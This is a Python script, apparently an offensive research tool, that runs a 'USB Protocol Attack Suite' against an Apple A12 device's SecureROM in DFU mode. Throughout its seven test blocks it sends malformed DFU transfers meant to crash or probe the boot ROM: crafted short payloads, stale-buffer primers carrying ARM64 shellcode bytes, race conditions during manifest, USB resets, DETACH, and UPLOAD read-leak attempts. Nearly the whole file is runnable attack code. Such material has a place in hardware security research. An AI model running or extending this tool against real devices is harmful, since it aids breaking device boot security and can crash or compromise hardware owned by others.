#!/usr/bin/env python3
"""
A12 SecureROM — USB Protocol Attack Suite
===========================================
The DER parser is a dead end (uniform rejection in ~3500us).
The OOB read hypothesis was disproved.

Remaining attack vectors:
  1. <16B crash: content-dependent behavior?
  2. Race conditions: DNLOAD during manifest, concurrent SETUP
  3. Partial transfer abort (stall mid-DATA)
  4. USB reset timing attacks
  5. DFU DETACH behavior
  6. EP0 STALL + recovery behavior

This tool systematically tests each one.
"""
import time, json, struct, statistics, sys
from datetime import datetime
from pathlib import Path

import usb.core, usb.util, libusb_package, usb.backend.libusb1

APPLE_VID = 0x05AC; DFU_PID = 0x1227
be = lambda: usb.backend.libusb1.get_backend(find_library=libusb_package.find_library)

def log(msg):
    print(f"[{datetime.now().strftime('%H:%M:%S.%f')[:-3]}] {msg}", flush=True)

class USBAttack:
    def __init__(self):
        self.dev = None

    def connect(self):
        self.dev = usb.core.find(idVendor=APPLE_VID, idProduct=DFU_PID, backend=be())
        if self.dev:
            try: self.dev.set_configuration()
            except: pass
            return True
        return False

    def ctrl(self, rt, req, val, idx, d, timeout=5000):
        return self.dev.ctrl_transfer(rt, req, val, idx, d, timeout=timeout)

    def status(self):
        try:
            r = self.ctrl(0xA1, 3, 0, 0, 6)
            return (r[4], r[0], r[1]|(r[2]<<8)|(r[3]<<16)) if len(r)>=6 else None
        except: return None

    def to_idle(self):
        for _ in range(20):
            s = self.status()
            if not s: time.sleep(0.1); self.connect(); continue
            if s[0] == 2: return True
            if s[0] == 10: self.ctrl(0x21, 4, 0, 0, 0)
            elif s[0] == 4: time.sleep(s[2]/1000+0.01); self.status()
            try: self.ctrl(0x21, 6, 0, 0, 0)
            except: pass
            time.sleep(0.02)
        return False

    def alive(self):
        try: return usb.core.find(idVendor=APPLE_VID, idProduct=DFU_PID, backend=be()) is not None
        except: return False

    def wait_reappear(self, timeout=5):
        """Wait for device to reappear after crash"""
        t0 = time.time()
        while time.time() - t0 < timeout:
            if self.alive():
                self.connect()
                return True
            time.sleep(0.2)
        return False

    def run(self):
        log("="*60)
        log("A12 — USB Protocol Attack Suite")
        log("="*60)

        if not self.connect():
            log("NO DFU DEVICE"); return

        results = {"timestamp": datetime.now().isoformat()}

        # =============================================================
        # Attack 1: <16B crash — does CONTENT affect crash behavior?
        # =============================================================
        log("\n=== Attack 1: <16B Content vs Crash ===")
        log("  Testing if different 15-byte payloads produce different crash timing")

        crash_tests = []

        test_payloads_15 = [
            ("zeros",       bytes(15)),
            ("0xFF",        b"\xFF" * 15),
            ("0x41",        b"\x41" * 15),
            ("img4_hdr",    b"\x30\x82\x00\x0B\x16\x04IMG4" + bytes(5)),  # valid DER start
            ("im4p_hdr",    b"\x30\x82\x00\x0B\x16\x04IM4P" + bytes(5)),
            ("null_seq",    b"\x30\x00" * 7 + b"\x00"),  # empty sequences
            ("big_int",     b"\x02\x82\x07\x00" + bytes(11)),  # INTEGER len=1792
            ("sram_addr",   struct.pack("<Q", 0x19C018000) + bytes(7)),
            ("rom_addr",    struct.pack("<Q", 0x100000000) + bytes(7)),
        ]

        for name, payload in test_payloads_15:
            if not self.to_idle():
                log(f"  {name}: no idle, reconnecting...")
                if not self.wait_reappear():
                    log(f"  DEVICE GONE after {name}"); break
                continue

            t0 = time.perf_counter_ns()
            try:
                self.ctrl(0x21, 1, 0, 0, payload, timeout=5000)
                dnload_ok = True
            except usb.core.USBError as e:
                dnload_ok = False
            t1 = time.perf_counter_ns()
            dnload_us = (t1 - t0) / 1000

            # Check status immediately
            s = self.status()
            t2 = time.perf_counter_ns()
            status_us = (t2 - t1) / 1000

            # Check if alive
            alive = self.alive()

            crash_tests.append({
                "name": name,
                "dnload_ok": dnload_ok,
                "dnload_us": round(dnload_us, 1),
                "state": s[0] if s else None,
                "bstatus": s[1] if s else None,
                "poll": s[2] if s else None,
                "status_us": round(status_us, 1),
                "alive": alive,
            })

            log(f"  {name:12s}: dnload={'OK' if dnload_ok else 'FAIL'} "
                f"{dnload_us:>8.0f}us  state={s[0] if s else 'X'} "
                f"bstatus={s[1] if s else 'X'} alive={alive}")

            if not alive:
                log(f"  >>> CRASH — waiting for reappear...")
                if not self.wait_reappear(10):
                    log(f"  DEVICE DID NOT REAPPEAR")
                    break

        results["crash_content_15B"] = crash_tests

        # =============================================================
        # Attack 2: Stale buffer + crash — primer then <16B
        # =============================================================
        log("\n=== Attack 2: Stale Buffer + Little Crash ===")
        log("  DNLOAD(2048B primer)+GET_STATUS, then DNLOAD(<16B)")

        stale_crash = []

        primers_and_triggers = [
            ("primer_zeros_trig_1B",  bytes(2048), b"\x00"),
            ("primer_zeros_trig_15B", bytes(2048), bytes(15)),
            ("primer_img4_trig_1B",   b"\x30\x82\x07\xF6\x16\x04IMG4" + bytes(2038), b"\x00"),
            ("primer_shellcode_trig_1B",
             # ARM64: MOV X0, #0; RET
             b"\x00\x00\x80\xD2\xC0\x03\x5F\xD6" * 256,
             b"\x00"),
        ]

        for name, primer, trigger in primers_and_triggers:
            if not self.to_idle():
                if not self.wait_reappear(): break
                self.to_idle()

            # Step 1: DNLOAD primer (2048B)
            try:
                self.ctrl(0x21, 1, 0, 0, primer, timeout=5000)
            except:
                log(f"  {name}: primer DNLOAD failed"); continue

            # Step 2: GET_STATUS → should be in DNLOAD-IDLE (5)
            s = self.status()
            if not s or s[0] != 5:
                log(f"  {name}: primer state={s[0] if s else 'X'} (expected 5)")
                self.to_idle(); continue

            # Step 3: ABORT (go back to IDLE with stale buffer)
            try: self.ctrl(0x21, 6, 0, 0, 0)
            except: pass
            time.sleep(0.01)

            s = self.status()
            if not s or s[0] != 2:
                log(f"  {name}: after abort state={s[0] if s else 'X'}")
                self.to_idle(); continue

            # Step 4: DNLOAD trigger (<16B) — should crash with stale buffer
            t0 = time.perf_counter_ns()
            try:
                self.ctrl(0x21, 1, 0, 0, trigger, timeout=5000)
                trig_ok = True
            except usb.core.USBError:
                trig_ok = False
            t1 = time.perf_counter_ns()
            trig_us = (t1 - t0) / 1000

            # Quick status check
            s = self.status()
            t2 = time.perf_counter_ns()

            alive = self.alive()

            stale_crash.append({
                "name": name,
                "trig_ok": trig_ok,
                "trig_us": round(trig_us, 1),
                "state": s[0] if s else None,
                "alive": alive,
            })

            log(f"  {name:35s}: trig={'OK' if trig_ok else 'FAIL'} "
                f"{trig_us:>8.0f}us state={s[0] if s else 'X'} alive={alive}")

            if not alive:
                log(f"  >>> CRASH — waiting...")
                self.wait_reappear(10)

        results["stale_crash"] = stale_crash

        # =============================================================
        # Attack 3: Race Condition — DNLOAD during MANIFEST
        # =============================================================
        log("\n=== Attack 3: DNLOAD During Manifest ===")
        log("  Trigger manifest, then immediately send another DNLOAD")

        race_tests = []

        for delay_ms in [0, 1, 2, 5, 10]:
            if not self.to_idle():
                if not self.wait_reappear(): break
                self.to_idle()

            # Normal manifest trigger
            try: self.ctrl(0x21, 1, 0, 0, bytes(2048), timeout=5000)
            except: continue
            s = self.status()
            if not s or s[0] != 5: continue

            # Zero-length → manifest
            try: self.ctrl(0x21, 1, 0, 0, b"", timeout=5000)
            except: pass

            # Wait specified delay
            if delay_ms > 0:
                time.sleep(delay_ms / 1000)

            # Try DNLOAD during manifest!
            t0 = time.perf_counter_ns()
            try:
                self.ctrl(0x21, 1, 0, 0, b"\x41" * 256, timeout=5000)
                race_ok = True
            except usb.core.USBError as e:
                race_ok = False
                race_err = str(e)
            t1 = time.perf_counter_ns()

            s = self.status()
            alive = self.alive()

            race_tests.append({
                "delay_ms": delay_ms,
                "race_ok": race_ok,
                "race_us": round((t1-t0)/1000, 1),
                "state": s[0] if s else None,
                "alive": alive,
            })

            log(f"  delay={delay_ms}ms: race={'OK' if race_ok else 'FAIL'} "
                f"state={s[0] if s else 'X'} alive={alive}")

            if not alive:
                self.wait_reappear(10)

        results["race_manifest"] = race_tests

        # =============================================================
        # Attack 4: USB Reset During Manifest
        # =============================================================
        log("\n=== Attack 4: USB Reset During Manifest ===")

        reset_tests = []

        for delay_ms in [0, 1, 2, 5]:
            if not self.to_idle():
                if not self.wait_reappear(): break
                self.to_idle()

            # Trigger manifest
            try: self.ctrl(0x21, 1, 0, 0, bytes(2048), timeout=5000)
            except: continue
            s = self.status()
            if not s or s[0] != 5: continue

            try: self.ctrl(0x21, 1, 0, 0, b"", timeout=5000)
            except: pass

            if delay_ms > 0:
                time.sleep(delay_ms / 1000)

            # USB Reset!
            t0 = time.perf_counter_ns()
            try:
                self.dev.reset()
                reset_ok = True
            except usb.core.USBError:
                reset_ok = False
            t1 = time.perf_counter_ns()

            time.sleep(1)
            alive = self.alive()
            if alive: self.connect()

            s = self.status() if alive else None

            reset_tests.append({
                "delay_ms": delay_ms,
                "reset_ok": reset_ok,
                "reset_us": round((t1-t0)/1000, 1),
                "alive": alive,
                "state": s[0] if s else None,
            })

            log(f"  delay={delay_ms}ms: reset={'OK' if reset_ok else 'FAIL'} "
                f"alive={alive} state={s[0] if s else 'X'}")

        results["reset_manifest"] = reset_tests

        # =============================================================
        # Attack 5: DFU DETACH (bRequest=0)
        # =============================================================
        log("\n=== Attack 5: DFU DETACH ===")

        if not self.to_idle():
            self.wait_reappear(); self.to_idle()

        detach_tests = []
        for wTimeout in [0, 100, 1000, 5000, 65535]:
            if not self.to_idle():
                if not self.wait_reappear(5): break
                self.to_idle()

            t0 = time.perf_counter_ns()
            try:
                self.ctrl(0x21, 0, wTimeout, 0, 0, timeout=5000)
                detach_ok = True
            except usb.core.USBError as e:
                detach_ok = False
            t1 = time.perf_counter_ns()

            s = self.status()
            alive = self.alive()

            detach_tests.append({
                "wTimeout": wTimeout,
                "ok": detach_ok,
                "time_us": round((t1-t0)/1000, 1),
                "state": s[0] if s else None,
                "alive": alive,
            })

            log(f"  wTimeout={wTimeout:5d}: {'OK' if detach_ok else 'FAIL'} "
                f"state={s[0] if s else 'X'} alive={alive}")

            if not alive:
                self.wait_reappear(5)

        results["detach"] = detach_tests

        # =============================================================
        # Attack 6: DFU_UPLOAD with various wLength (read leak)
        # =============================================================
        log("\n=== Attack 6: DFU_UPLOAD Leak Attempt ===")

        if not self.to_idle():
            self.wait_reappear(); self.to_idle()

        upload_tests = []

        # Try after DNLOAD (buffer has data) then switch to UPLOAD
        for state_before in ["idle", "after_dnload", "after_abort"]:
            if not self.to_idle():
                if not self.wait_reappear(): break
                self.to_idle()

            if state_before == "after_dnload":
                try: self.ctrl(0x21, 1, 0, 0, b"\x42" * 2048, timeout=5000)
                except: continue
                self.status()  # → state 5

            elif state_before == "after_abort":
                try: self.ctrl(0x21, 1, 0, 0, b"\x42" * 2048, timeout=5000)
                except: continue
                self.status()
                try: self.ctrl(0x21, 6, 0, 0, 0)
                except: pass

            for wlen in [6, 64, 256, 2048]:
                try:
                    data = self.ctrl(0xA1, 2, 0, 0, wlen, timeout=5000)
                    upload_tests.append({
                        "state": state_before,
                        "wLength": wlen,
                        "received": len(data),
                        "data_hex": bytes(data[:64]).hex() if len(data) > 0 else "",
                    })
                    log(f"  [{state_before:14s}] wLen={wlen:4d}: got {len(data)}B "
                        f"hex={bytes(data[:16]).hex() if data else 'empty'}")
                except usb.core.USBError as e:
                    upload_tests.append({
                        "state": state_before,
                        "wLength": wlen,
                        "error": str(e),
                    })
                    log(f"  [{state_before:14s}] wLen={wlen:4d}: {e}")

        results["upload_leak"] = upload_tests

        # =============================================================
        # Attack 7: wIndex/wValue abuse in DNLOAD
        # =============================================================
        log("\n=== Attack 7: DNLOAD with non-zero wValue/wIndex ===")

        wval_tests = []
        for wval, widx in [(0,0), (1,0), (0xFFFF,0), (0,1), (0,0xFFFF), 
                           (0x1234,0x5678), (0xDEAD,0xBEEF)]:
            if not self.to_idle():
                if not self.wait_reappear(): break
                self.to_idle()

            t0 = time.perf_counter_ns()
            try:
                self.ctrl(0x21, 1, wval, widx, bytes(64), timeout=5000)
                ok = True
            except usb.core.USBError:
                ok = False
            t1 = time.perf_counter_ns()

            s = self.status()
            alive = self.alive()

            wval_tests.append({
                "wValue": wval, "wIndex": widx,
                "ok": ok, "time_us": round((t1-t0)/1000,1),
                "state": s[0] if s else None, "alive": alive,
            })

            log(f"  wVal=0x{wval:04X} wIdx=0x{widx:04X}: "
                f"{'OK' if ok else 'FAIL'} state={s[0] if s else 'X'} alive={alive}")

            if not alive:
                self.wait_reappear(5)

        results["wval_abuse"] = wval_tests

        # Save
        outf = Path(__file__).parent / "results" / "usb_attack_suite.json"
        outf.parent.mkdir(exist_ok=True)
        with open(outf, "w") as f:
            json.dump(results, f, indent=2)
        log(f"\nSaved: {outf}")
        log("DONE")

if __name__ == "__main__":
    USBAttack().run()
